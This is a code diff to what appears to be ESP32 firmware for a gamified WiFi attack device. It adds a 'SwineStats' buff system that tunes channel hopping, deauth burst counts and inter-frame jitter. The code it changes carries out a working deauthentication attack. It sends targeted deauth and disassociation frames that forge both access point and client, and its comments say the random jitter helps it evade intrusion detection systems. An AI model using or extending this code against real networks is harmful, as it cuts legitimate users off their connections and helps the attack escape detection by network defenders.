@@ -7,6 +7,7 @@
 #include "../piglet/mood.h"
 #include "../piglet/avatar.h"
 #include "../ml/inference.h"
+#include "../ui/swine_stats.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <SPI.h>
@@ -315,8 +316,8 @@ void OinkMode::update() {
     // Auto-attack state machine (like M5Gotchi)
     switch (autoState) {
         case AutoState::SCANNING:
-            // Channel hopping during scan
-            if (now - lastHopTime > Config::wifi().channelHopInterval) {
+            // Channel hopping during scan (buff-modified interval)
+            if (now - lastHopTime > SwineStats::getChannelHopInterval()) {
                 hopChannel();
                 lastHopTime = now;
             }
@@ -411,10 +412,12 @@ void OinkMode::update() {
                     // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
                     // Targeted deauth is much more reliable than broadcast
                     if (target->clientCount > 0) {
+                        // Get buff-modified burst count (base 5, buffed up to 8, debuffed down to 3)
+                        uint8_t burstCount = SwineStats::getDeauthBurstCount();
                         for (int c = 0; c < target->clientCount && c < MAX_CLIENTS_PER_NETWORK; c++) {
-                            // Send more targeted deauths - these actually work
-                            sendDeauthBurst(target->bssid, target->clients[c].mac, 5);
-                            deauthCount += 5;
+                            // Send buff-modified deauths
+                            sendDeauthBurst(target->bssid, target->clients[c].mac, burstCount);
+                            deauthCount += burstCount;
                             
                             // Also disassoc targeted client
                             sendDisassocFrame(target->bssid, target->clients[c].mac, 8);
@@ -1485,14 +1488,16 @@ void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uin
 void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
     // Send burst of deauth frames for more effective disconnection
     // Random jitter between frames makes it harder for WIDS to detect pattern
+    // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t jitterMax = SwineStats::getDeauthJitterMax();
     
     for (uint8_t i = 0; i < count; i++) {
         // AP -> Client (pretend to be AP)
         sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
         
-        // Random jitter 1-5ms between forward and reverse frames
-        delay(random(1, 6));
+        // Random jitter 1-Nms between forward and reverse frames (buff-modified)
+        delay(random(1, jitterMax + 1));
         
         // Client -> AP (pretend to be client) - bidirectional attack
         if (memcmp(station, broadcast, 6) != 0) {
@@ -1510,9 +1515,9 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
             reversePacket[25] = 0x00;
             esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
             
-            // Jitter between iterations
+            // Jitter between iterations (buff-modified)
             if (i < count - 1) {
-                delay(random(1, 6));
+                delay(random(1, jitterMax + 1));
             }
         }
     }
